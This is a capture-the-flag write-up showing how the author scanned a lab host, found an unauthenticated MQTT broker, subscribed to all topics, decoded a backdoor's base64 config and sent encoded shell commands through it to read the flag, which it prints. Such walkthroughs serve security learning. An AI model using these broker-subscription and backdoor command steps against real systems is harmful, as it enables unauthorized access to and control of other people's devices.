"John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?"

```shell
nmap 10.201.94.95 -sV -p- -T4 -n
```

SS1
<img width="940" height="278" alt="Screenshot 2025-11-20 211556" src="https://github.com/user-attachments/assets/f9d1f971-6f23-4add-835e-f7a6415272a9" />



22/tcp   open  ssh                      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
1883/tcp open  mosquitto version 2.0.14

Mosquitto uses the MQTT protocol (1883) 

I used referred to: https://book.hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html?highlight=1883#1883---pentesting-mqtt-mosquitto

for information about MQTT protocol and possibilities about it.

### How MQTT Works

**Publish/Subscribe Model:** Publishers send messages to the broker on specific topics; subscribers receive messages from topics they've subscribed to. The broker manages all routing and topic filtering.

**Authentication and Encryption Issues:** Authentication is optional, and even when present, credentials can be sent in plaintext unless TLS is enforced, making brokers susceptible to MITM and credential theft.

<u>Unauthorized Access: By subscribing to wildcard topics (like `#` for "all topics"), attackers may capture sensitive data if brokers or ACLs are weak</u>

**Topic Manipulation:** Attackers might publish to topics they shouldn't have access to (especially in multi-tenant or poorly configured environments), leading to unauthorized device control

SS2
<img width="626" height="343" alt="Screenshot 2025-11-20 212230" src="https://github.com/user-attachments/assets/ec1854a4-449a-4a20-8053-c89d35e5d37d" />

```shell
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```

We can use this like so:

```shell
mosquitto_sub -h 10.201.94.95 -p 1883 -t "#" -v
```

SS3
<img width="903" height="563" alt="Screenshot 2025-11-20 212825" src="https://github.com/user-attachments/assets/cb038c38-7e05-4e9e-83f0-4d9b5d89e4fc" />


We can see the text:
```text
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

This is a base64 encoded JSON.

We can decode it by going to an online base64 decoder.

SS4
<img width="757" height="750" alt="Screenshot 2025-11-20 214116" src="https://github.com/user-attachments/assets/08e5461e-49d1-4b91-96bd-ba269a129334" />

The decoded message is:
```test
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

The pub_topic is
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub

The sub_topic is 
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub

So we will execute two steps:

1. Listen for responses in the pub_topic:

```bash 
mosquitto_sub -h 10.201.94.95 -p 1883 -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub'
```

2. Send a HELP request to see formatting:

```bash
mosquitto_pub -h 10.201.94.95 -p 1883 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m '{"cmd":"HELP"}'
```

(These two must be executed in separate terminals)

Once I sent the HELP request, I got more base64 encoded text in the terminal output

SS5
<img width="863" height="124" alt="Screenshot 2025-11-20 222207" src="https://github.com/user-attachments/assets/fe1a4d6e-7475-4d09-88cb-e6dea4174662" />

```text
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```

When decoded it reads:

```text
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

So now we know that the expectation is the entire JSON structure itself to be base64 encoded. Our id is:

```shell
cdd1b1c0-1c40-4b0f-8e22-61b357548b7d
```

So to send a command like the HELP message we must
- Build the JSON.
- Base64 encode it.
- Publish that base64 string to the sub topic.

For HELP:

```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"HELP","arg":""}
```

```makefile
echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"HELP","arg":""}' | base64
```

which is:

eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkhFTFAi
LCJhcmciOiIifQ==

and publish it:

```shell
mosquitto_pub -h 10.201.94.95 -p 1883 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkhFTFAiLCJhcmciOiIifQ=='
```

We get back a base64 encoded string again which reads (once decoded)

```text
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}
```

Sow now we know that to get the flag, we just need to send a CMD that cats the file. The unkown is the file name so we can try flag.txt

```json
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat flag.txt"}
```

Then encode it

```text
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImNhdCBmbGFnLnR4dCJ9
```

and publish this

```shell
mosquitto_pub -h 10.201.94.95 -p 1883 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IkNNRCIsImFyZyI6ImNhdCBmbGFnLnR4dCJ9'
```

and we get back the following terminal output:

```text
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
```

Which when decoded gives us the flag.
<img width="864" height="243" alt="Screenshot 2025-11-20 224119" src="https://github.com/user-attachments/assets/39527b5c-8717-4902-9f49-f75f126fd3a2" />
